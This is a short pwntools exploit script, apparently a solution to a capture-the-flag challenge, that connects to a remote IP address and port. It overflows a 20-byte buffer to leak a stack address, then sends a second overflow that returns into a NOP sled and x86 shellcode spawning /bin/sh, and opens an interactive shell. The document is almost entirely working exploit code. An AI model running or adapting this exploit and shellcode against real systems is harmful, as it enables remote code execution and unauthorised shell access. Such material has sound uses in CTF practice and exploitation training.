from pwn import *
context(arch='amd64', os='linux', endian='little')

p32 = lambda x: struct.pack("<L",x) #unsigned long
up32 = lambda x: struct.unpack("<L", x)[0] #unpack unsigned long

addr = "139.162.123.119"
port = 10000

s = remote(addr, port)

sleep(0.3)
print s.recvuntil("Let's start the CTF:")

payload = "A"*20
payload += p32(0x08048087) 
s.send(payload)

sleep(0.3)
stack = up32(s.recv(4))

print s.recv(4096)

payload = "A"*20
payload += p32(stack+20)
payload += "\x90"*10
payload += "\x31\xc0\x99\x50\x68\x6e\x2f\x73\x68"
payload += "\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53"
payload += "\x89\xe1\xb0\x0b\xcd\x80"

s.send(payload)

s.interactive()
s.close()
